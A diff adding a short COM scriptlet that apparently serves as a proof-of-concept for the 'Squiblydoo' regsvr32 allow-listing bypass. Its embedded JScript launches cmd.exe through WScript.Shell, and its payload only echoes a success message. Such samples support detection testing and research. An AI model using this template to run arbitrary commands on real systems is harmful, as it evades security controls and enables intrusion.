@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="RAPT.BoB"
+    progid="RAPT.BoB"
+    classid="{00000000-0000-0000-0000-000000000001}" >
+    <script language="JScript">
+        <![CDATA[
+            var run = new ActiveXObject("WScript.Shell").Run("cmd.exe /k echo squiblydoo attack success "); 
+    ]]>
+    </script>
+</registration>
+</scriptlet>
